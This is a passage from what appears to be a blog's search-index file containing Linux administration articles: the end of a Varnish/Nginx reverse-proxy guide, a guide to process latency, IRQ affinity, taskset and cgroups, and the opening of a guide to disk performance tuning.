cache comes from anywhere other than localhost, ignore it. if (req.request == \"PURGE\") {if (!client.ip ~ purge) {error 405 \"Not allowed.\";} return(lookup);} # Pass any requests that Varnish does not understand straight to the backend. if (req.request != \"GET\" \u0026\u0026 req.request != \"HEAD\" \u0026\u0026 req.request != \"PUT\" \u0026\u0026 req.request != \"POST\" \u0026\u0026 req.request != \"TRACE\" \u0026\u0026 req.request != \"OPTIONS\" \u0026\u0026 req.request != \"DELETE\") {return(pipe);} /* Non-RFC2616 or CONNECT which is weird. */ # Pass anything other than GET and HEAD directly. if (req.request != \"GET\" \u0026\u0026 req.request != \"HEAD\") {return(pass);} /* We only deal with GET and HEAD by default */ # Pass requests from logged-in users directly. if (req.http.Authorization || req.http.Cookie) {return(pass);} /* Not cacheable by default */ # Pass any requests with the \"If-None-Match\" header directly. if (req.http.If-None-Match) {return(pass);} # Force lookup if the request is a no-cache request from the client. if (req.http.Cache-Control ~ \"no-cache\") {ban_url(req.url);} return(lookup); } sub vcl_pipe { # This is otherwise not necessary if you do not do any request rewriting. set req.http.connection = \"close\"; } # Called if the cache has a copy of the page. sub vcl_hit { if (req.request == \"PURGE\") {ban_url(req.url); error 200 \"Purged\";} if (!obj.ttl \u003e 0s) {return(pass);} } # Called if the cache does not have a copy of the page. sub vcl_miss { if (req.request == \"PURGE\") {error 200 \"Not in cache\";} } # Called after a document has been successfully retrieved from the backend. sub vcl_fetch { set beresp.grace = 120s; if (beresp.ttl \u003c 48h) { set beresp.ttl = 48h;} if (!beresp.ttl \u003e 0s) {return(hit_for_pass);} if (beresp.http.Set-Cookie) {return(hit_for_pass);} if (req.http.Authorization \u0026\u0026 !beresp.http.Cache-Control ~ \"public\") {return(hit_for_pass);} } sub vcl_pass { return (pass); } sub vcl_hash { hash_data(req.url); if (req.http.host) { hash_data(req.http.host); } else { hash_data(server.ip); } return (hash); } sub vcl_deliver { # Debug remove resp.http.Via; remove resp.http.X-Varnish; # Add a header to indicate a cache HIT/MISS if (obj.hits \u003e 0) { set resp.http.X-Cache = \"HIT\"; set resp.http.X-Cache-Hits = obj.hits; set resp.http.X-Age = resp.http.Age; remove resp.http.Age; } else { set resp.http.X-Cache = \"MISS\"; } return (deliver); } sub vcl_error { set obj.http.Content-Type = \"text/html; charset=utf-8\"; set obj.http.Retry-After = \"5\"; synthetic {\" \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"\u003e \"} + obj.status + \" \" + obj.response + {\" Error \"} + obj.status + \" \" + obj.response + {\" \"} + obj.response + {\"\nGuru Meditation: XID: \"} + req.xid + {\"\nVarnish cache server\n\"}; return (deliver); } sub vcl_init { return (ok); } sub vcl_fini { return (ok); } Testing linkThe testing part is should be applied in the good order. For my personal usages, I waste too much time because I didn’t made the proper checks before. The things to check should be in that order:\nCheck Nginx backend on port 8000 Check Varnish access on port 80 Check SSL Nginx frontend on port 443 Add this index in your vhost server to get your header informations directly on the page:\n\u003c?php echo \"Show all headers :\\n\"; foreach($_SERVER as $h=\u003e$v) if(ereg('HTTP_(.+)',$h,$hp)) echo \"$h = $v\\n\"; header('Content-type: text/html'); ?\u003e To test it you can use curl:\n\u003e curl -I http://url HTTP/1.1 200 OK Server: nginx Content-Type: text/html; charset=UTF-8 Last-Modified: Tue, 07 Jan 2014 10:40:39 GMT Expires: Tue, 07 Jan 2014 11:40:39 GMT Pragma: public Cache-Control: public, must-revalidate, proxy-revalidate Etag: db7025811efc180e605972eb57550b68 X-Powered-By: W3 Total Cache/0.9.3 Vary: Accept-Encoding X-Pingback: http://blog.deimos.fr/xmlrpc.php Date: Tue, 07 Jan 2014 10:56:23 GMT X-Varnish: 964417199 964417198 Age: 4 Via: 1.1 varnish Connection: keep-alive Use wget:\n\u003e wget -SS http://url HTTP request sent, awaiting response... HTTP/1.1 200 OK Server: nginx Content-Type: text/html; charset=UTF-8 Last-Modified: Tue, 07 Jan 2014 10:40:39 GMT Expires: Tue, 07 Jan 2014 11:40:39 GMT Pragma: public Cache-Control: public, must-revalidate, proxy-revalidate Etag: db7025811efc180e605972eb57550b68 X-Powered-By: W3 Total Cache/0.9.3 Vary: Accept-Encoding X-Pingback: http://url Transfer-Encoding: chunked Date: Tue, 07 Jan 2014 10:57:22 GMT X-Varnish: 964417220 964417198 Age: 63 Via: 1.1 varnish Connection: keep-alive Length: unspecified [text/html] Or you can also use LiveHTTPHeader Firefox extension to see headers. Now press keyboard:\nCtrl+r: to reload the page (the second try should be cached) Ctrl+Shift+r: to reload the page asking the server to not deliver cached informations If you try to access in https, you should get something like that:\nShow all headers : HTTP_X_FORWARDED_HOST = test.deimos.fr HTTP_X_FORWARDED_PROTO = https HTTP_X_FORWARDED_PORT = 443 HTTP_HOST = 127.0.0.1 HTTP_USER_AGENT = Mozilla/5.0 (X11; Linux x86_64; rv:26.0) Gecko/20100101 Firefox/26.0 HTTP_ACCEPT = text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 HTTP_ACCEPT_LANGUAGE = fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3 HTTP_ACCEPT_ENCODING = gzip, deflate HTTP_COOKIE = _pk_id.1.5a2c=dfe5af08663a76b5.1388449087.3.1389005232.1388454622.; __qca=P0-1050834221-1388449087452; __cfduid=daa3baabbe79eb123b50f511c058dd29c1389819921950 HTTP_CACHE_CONTROL = max-age=0 HTTP_X_FORWARDED_FOR = 222.2.20.132, 127.0.0.1 HTTP_X_VARNISH = 1929521662 References linkhttp://mikkel.hoegh.org/blog/2012/07/24/varnish-as-reverse-proxy-with-nginx-as-web-server-and-ssl-terminator/\n"
            }
        );
    index.add(
            {
                id:  196 ,
                href: "\/Latence_des_process_et_kernel_timing\/",
                title: "Process Latency and Kernel Timing",
                description: "Guide on how to manage process latency, kernel timing, CPU scheduling, and resource allocation in Linux systems",
                content: " Software version Kernel 2.6.32+ Operating System Red Hat 6.3\nDebian 7 Website Kernel Website Last Update 05/01/2014 The Clocks linkThere are several clocks that allow you to obtain or manipulate time operations:\nRTC (Real Time Clock): this is the BIOS battery that keeps the date and time on a machine when it is turned off. You can get information about it in the /proc/driver/rtc file. TSC (Time Stamp Counter): this is a counter that is set to the same frequency as the CPU, even if it oscillates. The kernel uses the TSC with the RTC to calculate the date and time. PIC (Programmable Interrupt Counter): also known as PIT (Programmable Interval Timer) which allows to send interrupts to the kernel after a certain time has passed. It is generally used for process scheduling. APIC (Advanced Programmable Interrupt Controller): It also operates on the CPU clock and allows tracking of running processes and sends local interruptions to this processor. On a 2.6 kernel, the frequency of the PIC is 1MHz or 1 tick/ms (also called jiffy). This interval can be adjusted during kernel compilation or in boot parameters (for some distributions). A shorter tick value will give better resolution times, however, applications may run slightly slower.\nThe boot parameter is:\nGRUB_CMDLINE_LINUX_DEFAULT=\"quiet tick_divider=\" The interesting values are:\n2 = 500 Hz 4 = 250 Hz 5 = 200 Hz 8 = 125 Hz 10 = 100 Hz The advantage is the reduction of CPU overhead, but the scheduler is less fair with interactive processes.\nManaging CPU Speed linkIn Red Hat, there’s a tool to control the CPU clock speed. To do this, install the “cpuspeed” daemon and configure it in /etc/sysconfig/cpuspeed:\n# /etc/sysconfig/cpuspeed # # This configuration file controls the behavior of both the # cpuspeed daemon and various cpufreq modules. # For the vast majority of users, there shouldn't be any need to # alter the contents of this file at all. By and large, frequency # scaling should Just Work(tm) with the defaults. ### DRIVER ### # Your CPUFreq driver module # Note that many drivers are now built-in, rather than built as modules, # so its usually best not to specify one. # default value: empty (try to auto-detect/use built-in) DRIVER= ### GOVERNOR ### # Which scaling governor to use # Details on scaling governors for your cpu(s) can be found in # cpu-freq/governors.txt, part of the kernel-doc package # NOTES: # - The GOVERNOR parameter is only valid on centrino, powernow-k8 (amd64) # and acpi-cpufreq platforms, other platforms that support frequency # scaling always use the 'userspace' governor. # - Using the 'userspace' governor will trigger the cpuspeed daemon to run, # which provides said user-space frequency scaling. # default value: empty (defaults to ondemand on centrino, powernow-k8, # and acpi-cpufreq systems, userspace on others) GOVERNOR= ### FREQUENCIES ### # NOTE: valid max/min frequencies for your cpu(s) can be found in # /sys/devices/system/cpu/cpu*/cpufreq/scaling_available_frequencies # on systems that support frequency scaling (though only after the # appropriate drivers have been loaded via the cpuspeed initscript). # maximum speed to scale up to # default value: empty (use cpu reported maximum) MAX_SPEED= # minimum speed to scale down to # default value: empty (use cpu reported minimum) MIN_SPEED= ### SCALING THRESHOLDS ### # Busy percentage threshold over which to scale up to max frequency # default value: empty (use governor default) UP_THRESHOLD= # Busy percentage threshold under which to scale frequency down # default value: empty (use governor default) DOWN_THRESHOLD= ### NICE PROCESS HANDLING ### # Let background (nice) processes speed up the cpu # default value: 0 (background process usage can speed up cpu) # alternate value: 1 (background processes will be ignored) IGNORE_NICE=0 ##################################################### ########## HISTORICAL CPUSPEED CONFIG BITS ########## ##################################################### VMAJOR=1 VMINOR=1 # Add your favorite options here #OPTS=\"$OPTS -s 0 -i 10 -r\" # uncomment and modify this to check the state of the AC adapter #OPTS=\"$OPTS -a /proc/acpi/ac_adapter/*/state\" # uncomment and modify this to check the system temperature #OPTS=\"$OPTS -t /proc/acpi/thermal_zone/*/temperature 75\" You can get the current information like this:\ncpuspeed ---help 2\u003e\u00261 | more It’s possible to see the possible assignable values:\ncat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_frequencies 3166000 2667000 2333000 2000000 So 3.16Ghz, 2.66Ghz, 2.33Ghz or 2Ghz.\nAnd finally the governor shows the algorithm used. For example, here we use “on demand”, which changes the processor speed on the fly according to demand:\n\u003e cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors ondemand performance If you want the best performance, disable this daemon. The drawback is of course the power consumption (think of the environment). You should know that if you need very low latencies, it is strongly recommended to disable this daemon.\nIRQ Balancing linkMake sure that this information is correctly compiled in the kernel:\n\u003e grep -e VOLUNTARY -e BKL /boot/config-2.6.32-279.2.1.el6.x86_64 | grep -v '#' CONFIG_PREEMPT_VOLUNTARY=y CONFIG_BKL=y These options are designed to allow the kernel to preempt and schedule certain processes. The gain will be felt at the level of latency (especially network). For example, the kernel can handle disk IO operations and simultaneously receive interrupts from the network card. The handler doing disk IOs can be preempted in favor of the network card interrupt which would improve network latency.\nIt is nevertheless possible to disable IRQ balancing via a boot parameter:\nGRUB_CMDLINE_LINUX_DEFAULT=\"quiet noapic\" If IRQs are unevenly distributed across CPUs, the result can be inconsistent performance when interrupt handlers preempt processes that are on the CPU.\nTo see interrupts on interrupts:\n\u003e cat /proc/interrupts CPU0 CPU1 0: 121 38 IO-APIC-edge timer 1: 3 0 IO-APIC-edge i8042 7: 0 0 IO-APIC-edge parport0 8: 1 0 IO-APIC-edge rtc0 9: 0 0 IO-APIC-fasteoi acpi 12: 2 2 IO-APIC-edge i8042 16: 9138 9221 IO-APIC-fasteoi uhci_hcd:usb2 17: 119477 120478 IO-APIC-fasteoi uhci_hcd:usb4, uhci_hcd:usb7 18: 235767 237579 IO-APIC-fasteoi ata_generic, ata_piix, ata_piix, uhci_hcd:usb8 22: 627101 627432 IO-APIC-fasteoi ehci_hcd:usb1, uhci_hcd:usb5 23: 0 0 IO-APIC-fasteoi ehci_hcd:usb3, uhci_hcd:usb6 40: 4752698 0 HPET_MSI-edge hpet2 41: 0 4481502 HPET_MSI-edge hpet3 47: 704766 717489 PCI-MSI-edge eth0 48: 722 764 PCI-MSI-edge snd_hda_intel 49: 1462373 1492905 PCI-MSI-edge i915 NMI: 3001 2977 Non-maskable interrupts LOC: 754 731 Local timer interrupts SPU: 0 0 Spurious interrupts PMI: 3001 2977 Performance monitoring interrupts IWI: 0 0 IRQ work interrupts RES: 9186852 9208409 Rescheduling interrupts CAL: 607 596 Function call interrupts TLB: 447954 362994 TLB shootdowns TRM: 0 0 Thermal event interrupts THR: 0 0 Threshold APIC interrupts MCE: 0 0 Machine check exceptions MCP: 82 82 Machine check polls ERR: 0 MIS: 0 Interceptions allow exploiting cache affinity for CPU and equalizing the number of CPU visits. To give an IRQ affinity to a CPU to improve performance by making the best use of cache affinity, you need to specify the bitmap of a core in hexadecimal. For example:\necho \u003e /proc/irq//smp_affinity This will place this IRQ at the head of the active queue and preserve certain CPUs from being used for IRQ assignments. It is possible to configure this permanently in Red Hat in /etc/sysconfig/irqbalance. For those who want, it is possible to disable IRQ balancing:\nchkconfig irqbalance off For more information on IRQ affinities: http://kernel.org/doc/Documentation/IRQ-affinity.txt[^1]\nEnabling/Disabling CPUs On-the-fly linkIt is possible to enable or disable CPUs on-the-fly! It’s actually very easy. First verify that your kernel allows this kind of thing:\nCONFIG_HOTPLUG CONFIG_SMP CONFIG_HOTPLUG_CPU CONFIG_ACPI_HOTPLUG_CPU Get the list of processors:\n\u003e grep processor /proc/cpuinfo processor\t: 0 processor\t: 1 Then check your interrupts:\n\u003e cat /proc/interrupts CPU0 CPU1 0: 109 36 IO-APIC-edge timer 1: 3 0 IO-APIC-edge i8042 7: 0 0 IO-APIC-edge parport0 8: 1 0 IO-APIC-edge rtc0 9: 0 0 IO-APIC-fasteoi acpi 12: 1 3 IO-APIC-edge i8042 16: 13500 13486 IO-APIC-fasteoi uhci_hcd:usb3 17: 122633 122322 IO-APIC-fasteoi uhci_hcd:usb4, uhci_hcd:usb7 18: 157011 157338 IO-APIC-fasteoi ata_piix, ata_piix, uhci_hcd:usb8, ata_generic 22: 365980 365602 IO-APIC-fasteoi ehci_hcd:usb1, uhci_hcd:usb5 23: 0 0 IO-APIC-fasteoi ehci_hcd:usb2, uhci_hcd:usb6 40: 3995517 0 HPET_MSI-edge hpet2 41: 0 4003499 HPET_MSI-edge hpet3 47: 188227 196024 PCI-MSI-edge eth0 48: 472 468 PCI-MSI-edge snd_hda_intel 49: 1079730 1075353 PCI-MSI-edge i915 NMI: 2169 2188 Non-maskable interrupts LOC: 756 733 Local timer interrupts SPU: 0 0 Spurious interrupts PMI: 2169 2188 Performance monitoring interrupts IWI: 0 0 IRQ work interrupts RES: 7945496 7982861 Rescheduling interrupts CAL: 586 482 Function call interrupts TLB: 397248 414104 TLB shootdowns TRM: 0 0 Thermal event interrupts THR: 0 0 Threshold APIC interrupts MCE: 0 0 Machine check exceptions MCP: 68 68 Machine check polls ERR: 0 MIS: 0 To disable CPU 1:\necho 0 \u003e /sys/devices/system/cpu/cpu1/online We can see that there is only CPU 0 left:\n\u003e cat /proc/interrupts CPU0 0: 109 IO-APIC-edge timer 1: 3 IO-APIC-edge i8042 7: 0 IO-APIC-edge parport0 8: 1 IO-APIC-edge rtc0 9: 0 IO-APIC-fasteoi acpi 12: 1 IO-APIC-edge i8042 16: 13606 IO-APIC-fasteoi uhci_hcd:usb3 17: 123361 IO-APIC-fasteoi uhci_hcd:usb4, uhci_hcd:usb7 18: 157302 IO-APIC-fasteoi ata_piix, ata_piix, uhci_hcd:usb8, ata_generic 22: 366042 IO-APIC-fasteoi ehci_hcd:usb1, uhci_hcd:usb5 23: 0 IO-APIC-fasteoi ehci_hcd:usb2, uhci_hcd:usb6 40: 4010597 HPET_MSI-edge hpet2 41: 1 HPET_MSI-edge 47: 188715 PCI-MSI-edge eth0 48: 472 PCI-MSI-edge snd_hda_intel 49: 1085415 PCI-MSI-edge i915 NMI: 2177 Non-maskable interrupts LOC: 756 Local timer interrupts SPU: 0 Spurious interrupts PMI: 2177 Performance monitoring interrupts IWI: 0 IRQ work interrupts RES: 7981178 Rescheduling interrupts CAL: 587 Function call interrupts TLB: 397336 TLB shootdowns TRM: 0 Thermal event interrupts THR: 0 Threshold APIC interrupts MCE: 0 Machine check exceptions MCP: 68 Machine check polls ERR: 0 MIS: 0 Then reactivate CPU 1:\necho 1 \u003e /sys/devices/system/cpu/cpu1/online And everything gets back in place correctly :-). You should know that some CPUs cannot be disabled like the boot CPU.\nBalancing CPU Utilization linkEach core has its own run queue. For HyperThreaded processors, the logical processor uses the same run queue as the physical core. By default, there is a certain affinity and the tasks that occur on a CPU come back to it more or less automatically if other associated ones were going to see another CPU. Knowing that each CPU has its own cache, it’s better that way. However, if one core is more loaded than another, the scheduler looks at the run queues every 100ms (or 1ms if the core does nothing) and decides to rebalance the load. The problem arises in the case where this balancing system is done too often, we can experience latency to avoid caches miss (everything depends on the applications)! You then have to choose what you want the most. To see the list of programs and their associated core:\n\u003e ps axo comm,psr COMMAND PSR init 1 kthreadd 0 ksoftirqd/0 0 migration/0 0 watchdog/0 0 migration/1 1 ksoftirqd/1 1 watchdog/1 1 cpuset 0 khelper 1 kdevtmpfs 1 netns 1 sync_supers 1 bdi-default 0 kintegrityd 0 kblockd 1 khungtaskd 1 kswapd0 0 You can also see a process moving from one core to another:\nwatch -n2 'ps axo comm,pid,psr | grep ' taskset linkIf you want to assign specific CPUs to certain processes, it’s possible! The first step is to know the CPU bitmap. To give you an idea of how to get them:\n\u003e awk '/processor/{printf(\"CPU %s address : 0x0000000%s\\n\"), $3, $3}' /proc/cpuinfo ; echo 'All CPU : xXFFFFFFFF' CPU 0 address : 0x00000000 CPU 1 address : 0x00000001 CPU 2 address : 0x00000002 CPU 3 address : 0x00000003 All CPU : xXFFFFFFFF Then we will use the taskset command to assign a specific CPU to a PID:\ntaskset -p 0x00000001 You should know that Numa processors have RAM directly mapped with CPUs to increase performance. This doesn’t change the fact that other processors can use memory that is not associated with them. Here is a small overview of Numa:\n1\nYou can also specify parameters at the grub level to isolate CPUs (isolcpus):\n# grub.conf generated by anaconda # # Note that you do not have to rerun grub after making changes to this file # NOTICE: You have a /boot partition. This means that # all kernel and initrd paths are relative to /boot/, eg. # root (hd0,0) # kernel /vmlinuz-version ro root=/dev/mapper/vgos-root # initrd /initrd-[generic-]version.img #boot=/dev/sda default=0 timeout=5 splashimage=(hd0,0)/grub/splash.xpm.gz hiddenmenu title Red Hat Enterprise Linux Server (2.6.32-279.2.1.el6.x86_64) root (hd0,0) kernel /vmlinuz-2.6.32-279.2.1.el6.x86_64 ro root=/dev/mapper/vgos-root rd_NO_LUKS KEYBOARDTYPE=pc KEYTABLE=fr LANG=en_US.UTF-8 rd_LVM_LV=vgos/root rd_NO_MD rd_LVM_LV=vgos/swap SYSFONT=latarcyrheb-sun16 crashkernel=128M biosdevname=0 rd_NO_DM isolcpus=0 initrd /initramfs-2.6.32-279.2.1.el6.x86_64.img CPU pinning is now possible on this CPU. We’ll therefore have a smaller run queue and improved response times for tasks assigned to this CPU.\nFor more information: http://kernel.org/doc/Documentation/kernel-parameters.txt[^3]\ncpuset/cgroup linkcpuset is a more advanced version of taskset that provides a more elegant, flexible and scalable method for controlling runqueues and latency on tasks. A cpuset is a group of CPUs (scheduler domain/cgroups) on which we will be able to balance tasks:\n2\nTo ensure that these features are present in the kernel:\n\u003e grep -i cpuset /proc/filesystems /boot/config-`uname -r` /proc/filesystems:nodev\tcpuset /boot/config-3.2.0-3-amd64:CONFIG_CPUSETS=y /boot/config-3.2.0-3-amd64:CONFIG_PROC_PID_CPUSET=y The implementation of cpuset in the kernel is quite small and has no impact on the process scheduler. It uses a new VFS that does not introduce new system calls. This cpuset VFS can be mounted anywhere on the system. We will, for example, mount this in /mnt/cpuserts. Just create folders to make assignments to other CPUs. A CPU can belong to multiple cpusets.\nPrerequisites linkSet up cgroups mounting at boot:\ncgroup /sys/fs/cgroup cgroup defaults 0 0 In order to have all options enabled, you also need to modify the Grub options:\nGRUB_CMDLINE_LINUX_DEFAULT=\"quiet cgroup_enable=memory swapaccount=1\" Then update Grub:\nupdate-grub Reboot afterwards.\nCreation linkCreating a cgroup is very simple:\nmkdir /sys/fs/cgroup/mycgroup1 Assigning a CPU and its Memory to a cgroup linkWe will assign a CPU and its memory to our new cgroup (here, CPU 0):\necho 0 \u003e /sys/fs/cgroup/mycgroup1/cpuset.cpus echo 0 \u003e /sys/fs/cgroup/mycgroup1/cpuset.mems You can send multiple processors by separating them with commas, all enclosed in quotes.\nDedicating a CPU to a cgroup linkTo dedicate a CPU solely to certain processes:\necho 0 \u003e /sys/fs/cgroup/mycgroup1/cpuset.cpus Adding a Process to a cgroup linkTo add a process, it’s very simple, just send its PID to the tasks file:\necho \u003e /sys/fs/cgroup/mycgroup1/cpuset.tasks Or if you have multiple processes with the same name:\nfor pid in $(pidof apache2); do echo $pid \u003e /sys/fs/cgroup/mycgroup1/cpuset.tasks done Detaching a Process from a cgroup linkIt is possible to detach a process by attaching it to another cgroup or the machine’s cgroup:\necho \u003e /sys/fs/cgroup/tasks Deleting a cgroup linkTo delete a cgroup is very simple, just delete the folder in question:\nrm -Rf /sys/fs/cgroup/mycgroup1/cpuset. Monitoring Pressure on a cpuset linkIt is possible to monitor the pressure on cpusets by activating like this:\necho 1 \u003e /sys/fs/cgroup/memory_pressure_enabled With this option, the kernel will start tracking the memory usage of cpusets. You can then retrieve the statistics in each cgroup:\ncat /sys/fs/cgroup//memory_pressure You will find an execution average or the speed at which pages frames are freed.\nMiscellaneous linkHere are various tips:\nTo know which cgroup the PID is attached to: cat /proc//cpuset To know which resource a PID can be scheduled to: cat /proc//status | grep allowed To know if a CPU can belong to multiple cgroups: \u003e cat /sys/fs/cgroup/cpu_exclusive 1 Automatic deletion of the cgroup when no task is active on it: echo 1 \u003e /sys/fs/cgroup/mycgroup1/cpuset.notify_on_release Cgroups with cgconfig linkTo have cgroups working with cgconfig, be sure you’ve enabled cgroups in your fstab. Then install the daemon:\naptitude install cgroup-bin daemon It will check all new running processes and affect them to a correct cgroup if a rule exists.\nUnfortunately, it’s not well packaged yet on Debian so we need to adjust some things:\ncd /etc/init.d cp skeleton cgconfig cp skeleton cgred chmod 755 cgconfig cgred sed -i 's/skeleton/cgconfig/' cgconfig sed -i 's/skeleton/cgred/' cgred update-rc.d cgconfig defaults update-rc.d cgred defaults cd /usr/share/doc/cgroup-bin/examples/ cp cgred.conf /etc/default/ cp cgconfig.conf cgrules.conf /etc/ gzip -d cgconfig.gz cp cgconfig cgred /etc/init.d/ cd /etc/init.d/ sed -i 's/sysconfig/defaults/' cgred cgconfig sed -i 's/\\/etc\\/rc.d\\/init.d\\/functions/\\/lib\\/init\\/vars.sh/' cgred sed -i 's/--check/--name/' cgred sed -i 's/killproc.*/kill $(cat $pidfile)/' cgred sed -i 's/touch \"$lockfile\"/test -d \\/var\\/lock\\/subsys || mkdir \\/var\\/lock\\/subsys\\n\\t\u0026/' cgconfig chmod 755 cgconfig cgred You now have your configuration files and all services installed correctly. Edit the configuration file:\n# # Copyright IBM Corporation. 2007 # # Authors: Balbir Singh # This program is free software; you can redistribute it and/or modify it # under the terms of version 2.1 of the GNU Lesser General Public License # as published by the Free Software Foundation. # # This program is distributed in the hope that it would be useful, but # WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. # group mariadb_cgroup { perm { admin { uid = tomcat; } task { uid = tomcat; } } cpuset { cpuset.mems = 0; cpuset.cpus = \"1,2\"; cpuset.cpu_exclusive = 1; } } Here is an example for tomcat user, where I want to have 2 dedicated CPUs. Then you need to change the cgrules config:\ntomcat cpu tomcat_cgroup/ This indicates that tomcat user will change cpu settings and the cgroup folder is tomcat_cgroup (/sys/fs/cgroup/tomcat_cgroup). Now restart it:\n/etc/init.d/cgred stop /etc/init.d/cgconfig stop umount /sys/fs/cgroup 2\u003e/dev/null rmdir /sys/fs/cgroup/* /sys/fs/cgroup 2\u003e/dev/null mount /sys/fs/cgroup /etc/init.d/cgconfig start /etc/init.d/cgred start Restart your tomcat service and it will automatically be placed in the cgroup :-)\nReferences link http://en.wikipedia.org/wiki/Non-Uniform_Memory_Access ↩︎\nhttp://menehune.opt.wfu.edu/Kokua/SGI/007-3700-015/sgi_html/ch04.html ↩︎\n"
            }
        );
    index.add(
            {
                id:  197 ,
                href: "\/Optimiser_les_performances_des_disques_dur_sur_Linux\/",
                title: "Optimizing Hard Disk Performance on Linux",
                description: "This guide explains how to optimize disk performance on Linux, covering both mechanical hard drives and SSDs, with various techniques like partition alignment, scheduler optimization, and read-ahead settings.",
                content: " Software version Kernel 2.6.32+ Operating System Red Hat 6.3\nDebian 7 Website Kernel Website Last Update 02/01/2014 Introduction linkPhysical hard drives are currently the slowest components in our machines, whether they are mechanical hard drives with platters or even SSDs! But there are ways to optimize their performance according to specific needs. In this article, we’ll look at several aspects that should help you understand why bottlenecks can occur, how to avoid them, and solutions for benchmarking.\nWhat causes slowness? linkThere are several factors that can cause slow disk I/O. If you have mechanical disks, they will be slower than SSDs and have additional constraints:\nThe rotation speed of the disks The reading speed per second will be better on the outer part of the disks (the part furthest from the center) Data that is not aligned on the disk Small partitions present on the end of the disk The speed of the bus on which the disks are connected The seek time, corresponding to the time it takes for the read head to move Partition alignment linkAlignment consists of matching the logical blocks of partitions with the physical blocks to limit read/write operations and thus not hinder performance.\nCurrent SSDs work internally on blocks of 1 or 2 MiB, which is 1,048,576 or 2,097,152 bytes respectively. Considering that a sector stores 512 bytes, it will take 2,048 sectors to store 1,048,576 bytes. While traditionally operating systems started the first partition at the 63rd sector, the latest versions take into account the constraints of SSDs. Thus Parted can automatically align the beginning of partitions on multiples of 2,048 sectors.\nTo ensure proper alignment of partitions, enter the following command with administrative privileges and verify that the number of sectors at the beginning of each of your partitions is a multiple of 2,048. Here’s the command for an MSDOS partition table:\nfdisk -lu /dev/sdX If you have a GPT partition table:\nparted -l /dev/sdX Differences between electromechanical disks and SSDs linkTo better understand the difference between the inner part of the disk (closest to the center) and the outer part of the disk (farthest from the center), let me show you a test between a USB drive (linear, equivalent to an SSD) and a hard drive (non-linear). For this we will use a benchmark tool called bonnie++. So we install it:\naptitude install bonnie++ And we’ll launch a capture on both disks with the zcav utility which allows us to test the throughput in raw mode:\nfor i in sdc sdd ; do zcav -c1 /dev/$i \u003e\u003e ~/$i.zcav done The -c option allows you to specify the number of times to read the entire disk.\nThen we’ll generate a graph of the data with Gnuplot:\n\u003e gnuplot set term png crop set output '~/zcav_steppings.png' set xlabel 'Blocks' set xrange [0:] set ylabel 'Disk throughput (MiB/s)' set yrange [0:] set border 3 set xtics nomirror set ytics nomirror set title 'Zoned Constant Angular Velocity (ZCAV) steppings' set key below box plot '/home/pmavro/sdc.zcav' u 1:2 t '160 GiB Hard Drive' with lines, \\ '/home/pmavro/sdd.zcav' u 1:2 t '64 GiB USB key' with lines As a reminder, I wrote an article on Gnuplot. Here’s the result:\nWe can see very clearly that the hard disk performs very well at the beginning and suffers on the inside. The speed is almost twice as high on the outside as on the inside, and this is explained by the oscillating arm that reads more data over the same period of time on the outside.\nDifferent data buses linkThere are different types of buses:\nPCI PCI-X PCIe AGP … Today PCI-X is the fastest. If you have RAID cards, you can check the clock speed to ensure it’s running at its maximum to deliver as much throughput as possible. You can find all the necessary information for these buses on Wikipedia. It’s important to check:\nBus size: 32/64 bits Clock speed Here’s a small approximate summary (varies with technological advances):\nObject Latency Throughput 10krpm disk 3ms 50MB/s Swap access 8ms 50MB/s SSD disk 0.5ms 100MB/s Gigabit Ethernet 1ms 133MB/s PCI interface 0.1us 133MB/s malloc/mmap 0.1us fork 0.1ms gettimeofday 1us context switch 3us RAM 80ns 8GB/s PCI-Express 16x interface 10ns 8GB/s L2 Cache 5ns L1 Cache 1ns L1 Cache 0.3ns 40GB/s There are also SCSI type buses. These are a bit special, but you need to be careful not to mix different clock speeds on the same bus, bus sizes, passive/active terminations… You can use the sginfo command to retrieve all the SCSI parameters of your devices:\naptitude install sg-utils sginfo -a /dev/sda Caches and transfer rates linkRecent disk controllers have built-in caches to speed up read and write access. By default, many manufacturers disable write caching to avoid any data corruption. However, it’s possible to configure this cache to greatly accelerate access. Additionally, when these controllers are equipped with a battery, the cards are capable of keeping data for a few hours to a few days. Once the machine is turned on, the card will take care of writing the data to the disk(s).\nTo calculate the transfer rate of a disk in bytes/second:\nrate = (sectors per track * rpm * 512) / 60 For disks using ZCAV, you need to replace sectors per track with the average bytes per track:\nspeed = ((average sectors per track * 512 * rpm) /60) / 1000000 I/O requests and caches link High-level I/O requests such as read/write operations made by the Linux Virtual Filesystem layer must be transformed into block device requests. The kernel then proceeds to queue each block device. Each physical block makes its own queuing request. Queued requests are “Request Descriptors”. They describe the data structures that the kernel needs to handle I/O requests. A “request descriptor” can point to an I/O transfer that will in turn point to several disk blocks.\nWhen an I/O request on a device is issued, a special request structure is queued in the “Request Queue” for the device in question. The request structure contains pointers designating the sectors on the disk or the “Buffer Cache (Page Cache)”. If the request is:\nto read data, the transfer will be from disk to memory. to write data, the transfer will be from memory to disk. I/O request scheduling is a joint effort. A high-level driver places an I/O request in the request queue. This request is sent to the scheduler which will use an algorithm to process it. To avoid any bottleneck effect, the request will not be processed immediately, but put in blocked or connected mode. Once a certain number of requests is reached, the queue will be disconnected and a low-level driver will handle I/O request transfers to move blocks (disk) and pages (memory).\nThe unit used for I/O transfer is a page. Each page transferred from the disk corresponds to a page in memory. You can find out the size of cache pages and buffer cache like this:\n\u003e grep -ie '^cache' -ie '^buffer' /proc/meminfo Buffers: 233184 kB Cached: 2035636 kB Buffers: used for storing filesystem metadata Cached: used for caching data files In User mode, programs don’t have direct access to the contents of the buffers. Buffers are managed by the kernel in the “kernel space”. The kernel must copy data from these buffers into the user mode space of the process that requested the file/inode represented by cache blocks or memory pages.\nSequential read accesses link info Using read-ahead technology only makes sense for applications that read data sequentially! There’s no benefit for random accesses. When you make disk accesses, the kernel tries to read data sequentially from the disk. Read-ahead allows reading more blocks than requested to anticipate the demand and store this data in cache. Because when a block is read, it’s more than very common to need to read the next block, which is why it can be interesting to tune read-ahead. The advantages of this method are that:\nThe kernel is able to respond more quickly to the demand The disk controller load is reduced Response times are 